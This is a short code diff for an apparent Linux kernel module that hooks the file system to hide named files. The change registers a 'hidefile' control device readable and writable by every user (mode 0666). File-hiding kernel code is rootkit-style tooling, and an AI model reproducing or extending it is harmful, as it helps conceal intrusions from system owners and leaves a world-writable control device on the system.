@@ -18,7 +18,6 @@ extern int add_hidden_file(const char *name, bool is_dir);
 extern int remove_hidden_file(const char *name);
 
 /* Device node management */
-static struct miscdevice hidefile_dev;
 static bool dev_registered;
 
 static ssize_t hidefile_write(struct file *file, const char __user *buf,
@@ -107,6 +106,13 @@ static struct file_operations hidefile_fops = {
     .owner  = THIS_MODULE,
     .read   = hidefile_read,
     .write  = hidefile_write,
+};
+
+static struct miscdevice hidefile_dev = {
+    .minor  = MISC_DYNAMIC_MINOR,
+    .name   = "hidefile",
+    .fops   = &hidefile_fops,
+    .mode   = 0666,
 };
 
 int vfs_hook_init(void)
